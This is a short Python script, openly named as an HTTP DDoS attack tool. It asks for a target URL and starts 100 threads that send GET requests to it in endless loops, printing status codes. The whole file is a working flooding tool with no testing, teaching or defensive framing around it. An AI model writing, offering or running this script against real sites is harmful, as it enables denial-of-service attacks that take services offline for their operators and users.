import requests
import threading

def send_request(target_url):
    try:
        response = requests.get(target_url)
        print(f"[+] Sent request to {target_url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")

def http_ddos(target_url, thread_count=100):
    print(f"[+] Starting HTTP DDoS attack on {target_url}")

    def attack():
        while True:
            send_request(target_url)
    
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_url = input("Enter target URL (e.g., http://example.com): ")
    http_ddos(target_url)
